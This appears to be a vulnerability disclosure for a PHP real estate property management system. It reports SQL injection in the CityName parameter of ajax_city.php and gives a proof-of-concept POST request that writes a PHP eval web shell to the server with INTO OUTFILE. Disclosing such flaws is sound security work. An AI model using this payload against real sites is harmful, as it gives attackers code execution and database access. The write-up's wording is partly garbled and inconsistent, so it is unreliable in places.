# Real Estate Property Management System has upload_file and sql injection vulnerability in ajax_city.php

## supplier 
https://code-projects.org/real-estate-property-management-system-php-source-code/
## Vulnerability file
ajax_city.php

## describe

An unrestricted SQL injection and upload_file attack exists in an Real Estate Property Management System. The parameters that can be controlled are as follows: CityName. This function executes the id parameter into the SQL statement without any restrictions.Can upload shell in the server. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analy,sis**    

When the value of   CityName parameter is obtained in function , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. And upload the file.

![Image](https://github.com/user-attachments/assets/40c942bd-6b9a-4498-93fe-533c63e4859a)

## POC

```
POST /ajax_city.php HTTP/1.1
Host: property
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 114
Origin: http://property
Connection: close
Referer: http://property/ajax_city.php?
Upgrade-Insecure-Requests: 1
Priority: u=0, i

CityName=1'+UNION+SELECT+1,2,'<?php+eval($_POST[cmd]);?>'+into+outfile+'D:/phpstudy_pro/WWW/Property/shell.php'--+
```

**Result**

![Image](https://github.com/user-attachments/assets/5ae3093e-8c91-4ca1-90a1-456065b266ed)

![Image](https://github.com/user-attachments/assets/20c52585-4e86-4d76-98ce-152cc7b89798)

![image-20241226013405312](https://github.com/user-attachments/assets/fd4a6d5f-7c7d-418d-8db1-2bbd2d5bc9a0)